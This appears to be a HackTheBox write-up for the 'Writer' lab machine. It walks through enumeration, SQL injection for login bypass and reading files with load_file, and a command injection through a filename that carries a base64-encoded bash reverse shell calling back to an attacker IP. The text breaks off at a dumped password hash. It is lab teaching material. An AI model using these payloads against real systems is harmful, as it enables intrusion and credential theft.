---
title: HackTheBox - Writer
published: true
---

## Summary

10.129.212.12

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80/tcp | open | http | Apache httpd 2.4.41 |
| 139/tcp | open | netbios-ssn | Samba smbd 4.6.2 |
| 445/tcp | open | netbios-ssn | Samba smbd 4.6.2 |

Writer starts with directory fuzzing, locating a login page, then finding a vulnerable SQL query that is injectable to both bool injection for auth bypass and union injection for dumping data with the Load_File function. From there we can load the source of the web app and figure out it’s vulnerable to OS Command injection. Once we get a low priv shell as www-data we find creds for the database and logging in to the database gets us Kyle’s hash which as it is a weak password we can crack and, due to password reuse, ssh in as Kyle. From kyle, we can make use of a postfix configuration that includes a group writeable file when an email is sent, edit the file to place a payload to get a shell as John. The John user has write access to the apt config directory, and there is a cron running apt-get update as root that we can exploit for a root shell.

Overall, a fun multistep box, which taught me about the apt pivesc route and improved my SQL injection skills.

## Initial Recon

Use AutoRecon to automate the initial enumeration of the box

```bash
sudo autorecon -v 10.129.212.21
```

![autorecon](assets/writer_screenshots/autorecon.png)

## Nmap

```bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN "/home/tuz/hack/htb/boxes/writer/results/10.129.212.12/scans/_quick_tcp_nmap.txt" -oX "/home/tuz/hack/htb/boxes/writer/results/10.129.212.12/scans/xml/_quick_tcp_nmap.xml" 10.129.212.12
```

```bash
Nmap scan report for 10.129.212.12
Host is up, received user-set (0.0098s latency).
Scanned at 2021-12-12 16:09:26 GMT for 35s
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAA7IblnSMXNfqjkkoT+PAk2SPYBRL5gy0K0FQ2XbFGuPk6ImjJLrb0BF6qw3hU/I2V9ARRnn2SvHlz1+lLB0Ie9wkvH1gZfnUBd5X2sOS3vCzYJOBoD+yzJat40YmKx3NLjYCzkMd/KyTGGIH0cdlnROO6eJdnJN1QYMsrM4+QkkrQHtgz5KAk/aE18+1e5toWK1Px+KtVjvPWiD7mTb4J99f79L/5CCI9nUfmjeB8EU9qe3igUQ3zCGVFGUNTA9Vva99kh3SC6YjBe8+9ipFSZFVSqaJoJpZF83Oy2BEPWEb6lgo3cx7FwGH24nT833Y4Urk294/5ym8F3JFxo/FCgtjuYwp5Im1j9oVOGSnECKfC785zZiSu+ubdnxDjvbuRgW34DsKZpbtVvwxs8R/VNE3bSldVLmz5gCwP0Dfaop+Tbn7MW8OJWL6hEQqNiLw3cSBpzPId/EIMO7TMfqVXTfkMtD1yiIlafd3ianGLu+VUpJ3Bg8jk/COUOHj/M=
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+ZKRtm6JRYjPO1v8n2nR/cGDBj0Oaydm1VE6rUnvyI6bxfnPCaRjvxDrV3eW5rRXbK/ybC0k5WHtQ9iWogmAU=
|   256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaCZ4ALrn0m103XaA+e+YPrTO2f1hK8mAD5kUxJ7O9L
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/12%OT=22%CT=1%CU=32516%PV=Y%DS=2%DC=T%G=Y%TM=61B61E
OS:D9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=
OS:106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 17.565 days (since Thu Nov 25 02:36:41 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WRITER<00>           Flags: <unique><active>
|   WRITER<03>           Flags: <unique><active>
|   WRITER<20>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25163/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60751/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47607/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51813/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2021-12-12T16:09:59
|_  start_date: N/A

TRACEROUTE (using port 2702/tcp)
HOP RTT     ADDRESS
1   9.12 ms 10.10.14.1
2   9.61 ms 10.129.212.12

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 12 16:10:01 2021 -- 1 IP address (1 host up) scanned in 35.40 seconds
```

Nmap shows the box is probably Ubuntu from the services banners, we can find out which release by looking up the services versions on launchpad.

![launchpad](assets/writer_screenshots/launchpad_openssh_version.png)

Launchpad shows us this version of openssh is for Ubuntu Focal, also known as 20.04.

I will enumerate RPC / SMB first, as it's quick and easy.

### RPC Enumeration

Using enum4linux we can enumerate the RPC.

```bash
enum4linux -a -M -l -d 10.129.212.12 2>&1
```

This will produce quite a lot of information, the most interesting for us being user information.

![enum4linux](assets/writer_screenshots/enum4linux.png)

```bash
user:[kyle] rid:[0x3e8]
 User Name   : kyle
 Full Name   : Kyle Travis
 Home Drive  : \\writer\kyle
```

This also shows Account Lockout is off, so we could try and brute force this user's password through SMB or ssh with crackmapexec or hydra.

### SMB Enumeration

Using smbmap we can find available shares.

```bash
smbmap -H 10.129.212.12
```

![smbmap](assets/writer_screenshots/smbmap.png)

smbmap shows us we don't have unauthenticated access to any of the SMB shares.

We'll keep this in mind until we can find some users credentials.

Until then, we’ll move on to the web server on port 80.

### Web Server Enumeration

Let's navigate to the index page of the web server.

![indexpage](assets/writer_screenshots/indexpage.png)

Seems to be a writer's blog.

![aboutpage](assets/writer_screenshots/aboutpage.png)

The about page shows a possible username of admin@writer.htb

Nothing else useful from using the website or looking at the source, let's fuzz for directories with gobuster.

```bash
gobuster dir -u http://10.129.212.12/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 > tcp_80_http_gobuster_medium.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.212.12/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/12 18:48:18 Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 208] [--> http://10.129.212.12/]
/contact              (Status: 200) [Size: 4905]
/about                (Status: 200) [Size: 3522]
/static               (Status: 301) [Size: 315] [--> http://10.129.212.12/static/]
/.                    (Status: 200) [Size: 11971]
/dashboard            (Status: 302) [Size: 208] [--> http://10.129.212.12/]
/server-status        (Status: 403) [Size: 278]
/administrative       (Status: 200) [Size: 1443]
===============================================================
2021/12/12 18:49:19 Finished
===============================================================
```

The output shows an administrative page, let's poke at that.

![Administrative](assets/writer_screenshots/administrative.png)

No easily guessable creds get us logged in, let's try for SQL injection. We will use burp suite to make it easier.

Capture a login request and send it to repeater, so we can easily modify it.

![burploginrequest](assets/writer_screenshots/burploginrequest.png)

The post request for the login looks like `uname=admin&password=admin`

We’ll try a classic auth bypass SQL injection `admin' OR 1=1 -- -`

Let's url encode it for the post request `uname=admin'+OR+1%3d1+--+-&password=admin` and send it with burp.

![burp_sql_injection_auth_bypass](assets/writer_screenshots/burp_sql_injection_auth_bypass.png)

We get a 200 OK and a redirection to the dashboard

This works because the SQL server processing our request compares the username and password to known strings or hashes. We trick it by escaping the query with the `'`, giving it a logic operaton that is always true `1=1` and commenting out the rest of the query with MySQL comments `-- -`.

![burp_auth_bypass_redirect](assets/writer_screenshots/burp_auth_bypass_redirect.png)

We can show this in browser by right-clicking and selecting 'Show response in browser', copying the link and pasting it in the browser. Or we could copy our SQL Injection string into the user login field with a password.

We come to the dashboard.
![dashboard](assets/writer_screenshots/dashboard.png)

On the dashboard stories page, we can add a story, and it let's us upload an image.

![upload_image](assets/writer_screenshots/upload_image.png)

But trying to upload a shell and mess with the magic bytes or file extension doesn't help us here.

As we have SQL injection for the auth bypass, let's test for other types of SQL injection. Sometimes we can test how many columns are returned in the query with the `ORDER BY` statement, but that isn’t working here. We can instead use generic union null queries and inspect the response.

We can increase the amount of NULL’s in the query until we get unexpected behaviour, in this case we get logged in.

`test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL; -- -`

![burp_union_sql_injection](assets/writer_screenshots/burp_union_sql_injection.png)

Now we’ve got Union Injection, we can try dumping things. We can already log in, so let's try the MySQL `LoadFile` function.

`test' UNION ALL SELECT NULL,load_file('/etc/passwd'),NULL,NULL,NULL,NULL; -- -`

![burp_load_file_injection](assets/writer_screenshots/burp_load_file_injection.png)

Now let's fuzz for what else we can load.

`ffuf -u http://10.129.212.12/administrative -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "uname=test'+UNION+ALL+SELECT+NULL,load_file('FUZZ'),NULL,NULL,NULL,NULL%3b+--+&password=test" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 1295 > load_file_fuzzing.txt`

```bash
/etc/hosts              [Status: 200, Size: 1512, Words: 301, Lines: 42, Duration: 66ms]
/etc/apache2/apache2.conf [Status: 200, Size: 8758, Words: 1221, Lines: 260, Duration: 122ms]
/etc/aliases            [Status: 200, Size: 1342, Words: 290, Lines: 35, Duration: 126ms]
/etc/fstab              [Status: 200, Size: 2002, Words: 363, Lines: 45, Duration: 151ms]
/etc/hosts.deny         [Status: 200, Size: 2018, Words: 407, Lines: 50, Duration: 152ms]
/etc/passwd             [Status: 200, Size: 3332, Words: 298, Lines: 71, Duration: 159ms]
/etc/mtab               [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 74ms]
/etc/hosts.allow        [Status: 200, Size: 1714, Words: 361, Lines: 43, Duration: 186ms]
/etc/crontab            [Status: 200, Size: 2373, Words: 460, Lines: 55, Duration: 173ms]
/etc/issue              [Status: 200, Size: 1317, Words: 284, Lines: 35, Duration: 173ms]
/etc/passwd             [Status: 200, Size: 3332, Words: 298, Lines: 71, Duration: 81ms]
/etc/network/interfaces [Status: 200, Size: 1354, Words: 288, Lines: 38, Duration: 93ms]
/etc/lsb-release        [Status: 200, Size: 1403, Words: 282, Lines: 37, Duration: 147ms]
/etc/networks           [Status: 200, Size: 1382, Words: 290, Lines: 35, Duration: 169ms]
/etc/profile            [Status: 200, Size: 1944, Words: 424, Lines: 60, Duration: 128ms]
/etc/ssh/ssh_config     [Status: 200, Size: 2894, Words: 524, Lines: 85, Duration: 89ms]
/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 1892, Words: 282, Lines: 34, Duration: 88ms]
/etc/resolv.conf        [Status: 200, Size: 2016, Words: 377, Lines: 51, Duration: 115ms]
/etc/mysql/my.cnf       [Status: 200, Size: 2295, Words: 402, Lines: 62, Duration: 194ms]
/etc/samba/smb.conf     [Status: 200, Size: 10623, Words: 1787, Lines: 281, Duration: 134ms]
/proc/cpuinfo           [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 61ms]
/proc/ioports           [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 90ms]
/proc/meminfo           [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 68ms]
/proc/modules           [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 82ms]
/etc/ssh/sshd_config    [Status: 200, Size: 4627, Words: 575, Lines: 157, Duration: 117ms]
/proc/mounts            [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 110ms]
/proc/self/net/arp      [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 103ms]
/proc/version           [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 107ms]
/proc/swaps             [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 112ms]
/proc/stat              [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 128ms]
/proc/filesystems       [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 144ms]
/proc/interrupts        [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 169ms]
/var/log/dpkg.log       [Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 72ms]
/var/log/wtmp           [Status: 200, Size: 59803, Words: 283, Lines: 75, Duration: 54ms]
/var/run/utmp           [Status: 200, Size: 2443, Words: 280, Lines: 33, Duration: 72ms]
/var/log/dmesg          [Status: 200, Size: 127326, Words: 21037, Lines: 1668, Duration: 199ms]
/var/log/lastlog        [Status: 200, Size: 293878, Words: 280, Lines: 33, Duration: 212ms]
```

We can read the apache2 config file, maybe we can read the default site config as well.

`test' UNION ALL SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL,NULL,NULL,NULL; -- -`

```txt
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
# ServerName dev.writer.htb
# ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
# Alias /static /var/www/writer2_project/static
# <Directory /var/www/writer2_project/static>
#  Require all granted
# </Directory>
#
# <Directory /var/www/writer2_project/writerv2>
#  <Files wsgi.py>
#   Require all granted
#  </Files>
# </Directory>
#
# WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
# WSGIProcessGroup writer2_project
# WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Seeing the directory structure makes me think of a Flask app. Let's try the default `__init.py__`

`test' UNION ALL SELECT NULL,load_file('/var/www/writer.htb/writer/__init__.py'),NULL,NULL,NULL,NULL; -- -`

```py
Welcome from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```

Now we have the source code of the web app.

There is a vulnerable os.system call that takes the user supplied uploaded file name as input. We should be able to get OS Command Injection here.

```py
if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

Let's go back to uploading an image from before, but upload an image with a malicious file name.

We'll start with a classic bash reverse shell payload `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.56/9001 0>&1"` which we will base64 encode to avoid bad characters, then we can base64 decode it and pipe it to bash.

```bash
echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.54/9001 0>&1  "' | base64 -w0
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi
```

Create our payload.

```bash
echo -n L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 -d|bash
```

Now we can create our malicious file name. We'll use semicolons as command separators, and backticks for command substitution and pipe to pipe output to other commands.

```bash
touch "1.jpg;`echo -n L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 -d|bash`;"
```

Upload the file, intercept the request with burp and change the mime type to image/jpeg.

![burp_image_upload](assets/writer_screenshots/burp_image_upload.png)

Start a netcat listener.

```bash
nc -lvnp 9001
```

Now on the same intercepted request, remove the file name and put the full path to the file in the image_url field.

```bash
file:///var/www/writer.htb/writer/static/img/1.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 -d|bash`;
```

![burp_image_url](assets/writer_screenshots/burp_image_url.png)

The page hangs and we catch a reverse shell.

![reverse_shell](assets/writer_screenshots/reverse_shell.png)

We can get a pty with the python trick.

```bash
www-data@writer:/$ which python
which python
www-data@writer:/$ which python3
which python3
/usr/bin/python3
www-data@writer:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@writer:/$ ^Zfish: Job 1, 'nc -lvnp 9001' has stopped
tuz@hackbox ~> stty echo -raw;fg
Send job 1, “nc -lvnp 9001” to foreground


www-data@writer:/$ export TERM=xterm
export TERM=xterm
```

## PrivEsc

## mySQL

Let's try poking at the database some more.

```bash
cat /etc/mysql/my.cnf
```

```txt
...snip...
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

We found the database creds, let's log in and see what we can get.

```bash
mysql -u djangouser -p
Enter password: DjangoSuperPassword

...snip...

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]> use dev
Database changed
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)

MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.001 sec)
```

We found a hashed password for kyle, and we know from the passwd file and the rpc enum from earlier that he's a user. Let's crack the hash.

```bash
